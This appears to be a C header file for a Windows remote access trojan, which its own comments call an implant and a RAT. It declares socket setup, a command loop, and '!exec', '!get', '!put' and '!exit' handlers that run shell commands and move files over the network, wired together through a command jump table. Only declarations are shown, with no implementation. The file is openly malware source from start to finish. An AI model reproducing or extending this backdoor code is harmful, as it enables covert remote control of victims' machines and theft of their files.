#ifndef _IMPLANT_H
#define _IMPLANT_H

#include <winsock2.h>

#ifndef _MYIO
#define _MYIO

#define IN  // param is solely input
#define OUT // modifies param as output

#endif

int init_socket(OUT SOCKET *s);
void enter_cmd_loop(IN SOCKET *s);

/*
	* core functionalities:
	*	impl_EXEC:    execute shell commands
	*	impl_GET:     download file
	*	impl_PUT:     upload file
	*	impl_EXIT:    close RAT
*/
BOOL impl_EXEC(IN SOCKET *s, IN const char *params);
BOOL impl_GET(IN SOCKET *s, IN const char *params);
BOOL impl_PUT(IN SOCKET *s, IN const char *params);
BOOL impl_EXIT(IN SOCKET *s, IN const char *params);

typedef BOOL (*IMPL_FUNC) (
	IN SOCKET      *s,
	IN const char  *params
);

/*
	* command jump table
*/
#define IMPL_MAX_CMDS 4

#define MAX_IMPL_CMD_FUNC_SZ 15 // max size of each const char *impl_cmd_funcs below

static const char *impl_cmd_funcs[IMPL_MAX_CMDS] = {
	"!exec", "!get", "!put",
	"!exit"
};

static const IMPL_FUNC impl_funcs[IMPL_MAX_CMDS] = {
	impl_EXEC, impl_GET, impl_PUT,
	impl_EXIT
};

#endif